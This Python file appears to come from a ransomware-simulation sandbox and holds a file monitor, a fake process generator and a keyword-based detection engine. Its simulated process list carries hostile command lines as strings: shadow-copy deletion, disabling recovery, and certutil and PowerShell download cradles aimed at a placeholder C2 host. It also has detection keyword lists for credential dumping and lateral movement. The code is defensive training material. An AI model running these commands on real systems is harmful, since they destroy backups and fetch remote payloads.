"""
Monitoring Engine
Provides file activity monitoring, process monitoring, and detection rules.

Process lists, suspicious indicators, and detection rules are generated
procedurally rather than drawn from fixed tables.
"""

import os
import time
import math
import random
from datetime import datetime
from pathlib import Path
from collections import defaultdict


class FileActivityMonitor:
    """Monitors file system activity in the sandbox directory."""

    def __init__(self, sandbox_path):
        self.sandbox_path = Path(sandbox_path)
        self.events = []
        self.file_snapshots = {}
        self.modification_history = []

    def take_snapshot(self):
        """Take a snapshot of current file state."""
        snapshot = {}
        if self.sandbox_path.exists():
            for f in self.sandbox_path.rglob("*"):
                if f.is_file():
                    stat = f.stat()
                    snapshot[str(f)] = {
                        "name": f.name,
                        "size": stat.st_size,
                        "modified": stat.st_mtime,
                        "extension": f.suffix,
                    }
        self.file_snapshots = snapshot
        return snapshot

    def detect_changes(self):
        """Compare current state with last snapshot."""
        events = []
        current = {}

        if self.sandbox_path.exists():
            for f in self.sandbox_path.rglob("*"):
                if f.is_file():
                    stat = f.stat()
                    current[str(f)] = {
                        "name": f.name,
                        "size": stat.st_size,
                        "modified": stat.st_mtime,
                        "extension": f.suffix,
                    }

        # New files
        new_files = set(current.keys()) - set(self.file_snapshots.keys())
        for f in new_files:
            events.append(self._event("INFO", f"New file detected: {current[f]['name']}", {"file": current[f]}))

        # Deleted files
        deleted_files = set(self.file_snapshots.keys()) - set(current.keys())
        for f in deleted_files:
            events.append(self._event("WARNING", f"File deleted: {self.file_snapshots[f]['name']}", {"file": self.file_snapshots[f]}))

        # Modified files
        for f in set(current.keys()) & set(self.file_snapshots.keys()):
            if current[f]["modified"] != self.file_snapshots[f]["modified"]:
                events.append(self._event("INFO", f"File modified: {current[f]['name']}", {"file": current[f]}))

        self.file_snapshots = current
        self.modification_history.append({"timestamp": datetime.now().isoformat(), "changes": len(events)})
        return events

    def get_file_list(self):
        """List current files in sandbox."""
        files = []
        if self.sandbox_path.exists():
            for f in self.sandbox_path.rglob("*"):
                if f.is_file():
                    stat = f.stat()
                    files.append({
                        "name": f.name,
                        "path": str(f.relative_to(self.sandbox_path)),
                        "size": stat.st_size,
                        "extension": f.suffix,
                        "modified": datetime.fromtimestamp(stat.st_mtime).isoformat(),
                    })
        return files

    def _event(self, level, message, details=None):
        return {
            "timestamp": datetime.now().isoformat(),
            "source": "file_monitor",
            "level": level,
            "message": message,
            "details": details or {},
        }


# ── Process pools for procedural generation ──────────────────────────

_SYSTEM_PROCS = [
    ("System", "SYSTEM"),
    ("csrss.exe", "SYSTEM"),
    ("smss.exe", "SYSTEM"),
    ("wininit.exe", "SYSTEM"),
    ("services.exe", "SYSTEM"),
    ("lsass.exe", "SYSTEM"),
    ("svchost.exe", "SYSTEM"),
    ("spoolsv.exe", "SYSTEM"),
    ("WmiPrvSE.exe", "SYSTEM"),
    ("dllhost.exe", "SYSTEM"),
]

_USER_PROCS = [
    "explorer.exe", "chrome.exe", "firefox.exe", "msedge.exe",
    "outlook.exe", "WINWORD.EXE", "EXCEL.EXE", "Teams.exe",
    "OneDrive.exe", "SearchUI.exe", "RuntimeBroker.exe",
    "taskhostw.exe", "sihost.exe", "dwm.exe", "notepad.exe",
]

_AV_PROCS = [
    "MsMpEng.exe", "coreServiceShell.exe", "SentinelAgent.exe",
    "CylanceSvc.exe", "bdagent.exe", "ekrn.exe",
]

_SUSPICIOUS_NAMES = [
    "svchost32.exe", "svch0st.exe", "csrs.exe", "lssas.exe",
    "winlogon_update.exe", "taskh0st.exe", "runtime_broker.exe",
    "system_updater.exe",
]

_SUSP_CMDLINES = [
    "powershell -enc {b64}",
    "cmd /c vssadmin delete shadows /all /quiet (SIMULATED)",
    "cmd /c bcdedit /set {{default}} recoveryenabled No (SIMULATED)",
    "certutil -urlcache -split -f http://{c2}/payload.exe (SIMULATED)",
    "wmic shadowcopy delete (SIMULATED)",
    "powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://{c2}/s') (SIMULATED)",
]


class ProcessMonitor:
    """Simulates process monitoring with procedurally generated data."""

    def __init__(self):
        self.attack_active = False
        # Build baseline once so PID order is stable within the same controller
        self._baseline = self._build_baseline()

    def _build_baseline(self):
        """Generate a baseline process list with randomised PIDs and resource usage."""
        procs = []
        pid = 4  # System always PID 4
        for name, user in _SYSTEM_PROCS:
            procs.append(self._make_proc(pid, name, user, "normal"))
            pid += random.randint(50, 200)

        user_name = "victim"
        for name in random.sample(_USER_PROCS, k=random.randint(5, 9)):
            procs.append(self._make_proc(pid, name, user_name, "normal"))
            pid += random.randint(30, 150)

        av = random.choice(_AV_PROCS)
        procs.append(self._make_proc(pid, av, "SYSTEM", "normal"))

        return procs

    @staticmethod
    def _make_proc(pid, name, user, status, cmdline=None):
        p = {
            "pid": pid,
            "name": name,
            "user": user,
            "cpu": round(random.uniform(0.0, 12.0), 1),
            "memory": round(random.uniform(0.1, 350.0), 1),
            "status": status,
        }
        if cmdline:
            p["cmdline"] = cmdline
        return p

    def _gen_suspicious(self, count):
        """Generate suspicious processes on the fly."""
        c2 = f"{random.choice(['shadow','relay','nexus'])}{random.randint(10,99)}.example.com"
        b64 = "U0lNVUxBVEVEX0VOQ09ERURfQ09NTUFORA=="  # base64 placeholder
        out = []
        base_pid = random.randint(5000, 9000)
        for i, name in enumerate(random.sample(_SUSPICIOUS_NAMES, k=min(count, len(_SUSPICIOUS_NAMES)))):
            cmdline = None
            if random.random() < 0.6:
                tpl = random.choice(_SUSP_CMDLINES)
                cmdline = tpl.format(b64=b64, c2=c2)
            proc = self._make_proc(base_pid + i * random.randint(1, 30), name, "victim", "suspicious", cmdline)
            # Suspicious procs tend to have higher CPU
            proc["cpu"] = round(random.uniform(15.0, 85.0), 1)
            out.append(proc)
        return out

    def get_process_list(self, include_suspicious=False):
        """Get simulated process list."""
        # Slightly jitter CPU/memory each call to look alive
        procs = []
        for p in self._baseline:
            copy = dict(p)
            copy["cpu"] = round(max(0, p["cpu"] + random.uniform(-1, 1)), 1)
            copy["memory"] = round(max(0.1, p["memory"] + random.uniform(-5, 5)), 1)
            procs.append(copy)

        if include_suspicious or self.attack_active:
            procs.extend(self._gen_suspicious(random.randint(1, 3)))

        return procs

    def set_attack_active(self, active):
        self.attack_active = active


# ── Detection engine ─────────────────────────────────────────────────

_SEVERITY_ORDER = {"LOW": 0, "MEDIUM": 1, "HIGH": 2, "CRITICAL": 3}


class DetectionEngine:
    """Behavioural detection engine that infers indicators from event patterns."""

    def __init__(self):
        self.alerts = []
        self._rule_counter = 0
        self._rules = self._generate_rules()

    # ── rule generation ──────────────────────────────────────────────

    def _next_id(self):
        self._rule_counter += 1
        return f"DET-{self._rule_counter:03d}"

    def _generate_rules(self):
        """Build detection-rule catalogue dynamically."""
        defs = [
            ("Mass File Modification",     "HIGH",     "Multiple files modified in rapid succession"),
            ("High File Entropy",          "MEDIUM",   "Files with unusually high entropy detected (possible encryption)"),
            ("Rapid File Renaming",        "HIGH",     "Multiple files renamed with new extensions"),
            ("Suspicious Process Activity","HIGH",     "Process with suspicious name or behaviour detected"),
            ("Shadow Copy Deletion",       "CRITICAL", "Attempt to delete volume shadow copies"),
            ("Ransom Note Creation",       "CRITICAL", "File matching ransom note pattern detected"),
            ("Unusual Network Activity",   "MEDIUM",   "Abnormal outbound data transfer detected"),
            ("Security Tool Tampering",    "HIGH",     "Attempt to disable security software detected"),
            ("Credential Dumping",         "HIGH",     "Credential harvesting activity detected"),
            ("Privilege Escalation",       "HIGH",     "Unauthorized privilege level change detected"),
            ("Lateral Movement",           "HIGH",     "Movement to additional hosts detected"),
        ]
        rules = []
        for name, sev, desc in defs:
            rules.append({"id": self._next_id(), "name": name, "severity": sev, "description": desc})
        return rules

    def _rule_by_name(self, name_fragment):
        """Look up a rule by partial name match (case-insensitive)."""
        fragment = name_fragment.lower()
        for r in self._rules:
            if fragment in r["name"].lower():
                return r
        # Fallback: generate ad-hoc rule
        return {"id": self._next_id(), "name": name_fragment, "severity": "MEDIUM",
                "description": f"Detected: {name_fragment}"}

    # ── behavioural analysis ─────────────────────────────────────────

    def analyze_events(self, events):
        """Analyse events using behavioural heuristics rather than exact string matching."""
        alerts = []
        stages_seen = set()
        level_counts = defaultdict(int)
        ext_changes = 0
        file_mods = 0

        _ENCRYPTION_HINTS = {"encrypt", "locked", "ransom", "cipher", "demo_locked"}
        _EVASION_HINTS = {"disabl", "tamper", "bypass", "evasion", "impair"}
        _EXFIL_HINTS = {"exfiltrat", "outbound", "transfer", "upload", "staging"}
        _CRED_HINTS = {"credential", "harvest", "dump", "kerberos", "ntlm", "mimikatz", "lsass"}
        _PRIV_HINTS = {"privilege", "escalat", "elevat", "uac", "token"}
        _LATERAL_HINTS = {"lateral", "pivot", "remote", "psexec", "wmi", "ssh"}

        for ev in events:
            stage = ev.get("stage", "")
            level = ev.get("level", "")
            msg = (ev.get("message") or "").lower()
            stages_seen.add(stage)
            level_counts[level] += 1

            # --- behavioural pattern: bulk file changes ---
            if any(kw in msg for kw in ("file modified", "file renamed", "extension changed")):
                file_mods += 1
            if any(kw in msg for kw in ("renamed", "new extension", ".demo_locked")):
                ext_changes += 1

            # --- encryption / ransomware indicators ---
            if any(kw in msg for kw in _ENCRYPTION_HINTS):
                alerts.append(self._create_alert(self._rule_by_name("Mass File Modification"), ev))
                if "ransom" in msg or "note" in msg or "locked" in msg:
                    alerts.append(self._create_alert(self._rule_by_name("Ransom Note"), ev))

            # --- evasion / security tampering ---
            if any(kw in msg for kw in _EVASION_HINTS) or stage == "evasion":
                alerts.append(self._create_alert(self._rule_by_name("Security Tool Tampering"), ev))

            # --- exfiltration ---
            if any(kw in msg for kw in _EXFIL_HINTS) or stage == "exfiltration":
                if level in ("WARNING", "ALERT"):
                    alerts.append(self._create_alert(self._rule_by_name("Unusual Network Activity"), ev))

            # --- credential access ---
            if any(kw in msg for kw in _CRED_HINTS) or stage == "credentials":
                if level in ("WARNING", "ALERT"):
                    alerts.append(self._create_alert(self._rule_by_name("Credential Dumping"), ev))

            # --- privilege escalation ---
            if any(kw in msg for kw in _PRIV_HINTS) or stage == "privilege_escalation":
                if level in ("WARNING", "ALERT"):
                    alerts.append(self._create_alert(self._rule_by_name("Privilege Escalation"), ev))

            # --- lateral movement ---
            if any(kw in msg for kw in _LATERAL_HINTS) or stage == "lateral_movement":
                if level in ("WARNING", "ALERT"):
                    alerts.append(self._create_alert(self._rule_by_name("Lateral Movement"), ev))

        # --- aggregate heuristics ---
        if file_mods >= 3:
            alerts.append(self._create_alert(
                self._rule_by_name("Mass File Modification"),
                {"message": f"{file_mods} file modifications in burst"}))

        if ext_changes >= 2:
            alerts.append(self._create_alert(
                self._rule_by_name("Rapid File Renaming"),
                {"message": f"{ext_changes} extension changes detected"}))

        # Kill chain progression — severity scales with stage count
        if len(stages_seen) >= 3:
            sev = "HIGH" if len(stages_seen) < 5 else "CRITICAL"
            alerts.append({
                "timestamp": datetime.now().isoformat(),
                "rule_id": "DET-KC",
                "name": "Kill Chain Progression",
                "severity": sev,
                "description": f"Multiple attack stages detected ({len(stages_seen)}): {', '.join(sorted(stages_seen))}",
                "recommendation": "Isolate affected systems and initiate incident response",
            })

        # Deduplicate by (rule_id, triggering message) keeping highest severity
        seen_keys = {}
        deduped = []
        for a in alerts:
            key = (a.get("rule_id"), a.get("triggering_event", ""))
            existing = seen_keys.get(key)
            if existing is None:
                seen_keys[key] = len(deduped)
                deduped.append(a)
            else:
                if _SEVERITY_ORDER.get(a.get("severity", "LOW"), 0) > _SEVERITY_ORDER.get(deduped[existing].get("severity", "LOW"), 0):
                    deduped[existing] = a

        self.alerts.extend(deduped)
        return deduped

    def get_rules(self):
        return self._rules

    def get_alerts(self):
        return self.alerts

    def _create_alert(self, rule, triggering_event):
        return {
            "timestamp": datetime.now().isoformat(),
            "rule_id": rule["id"],
            "name": rule["name"],
            "severity": rule["severity"],
            "description": rule["description"],
            "triggering_event": triggering_event.get("message", "") if isinstance(triggering_event, dict) else str(triggering_event),
        }
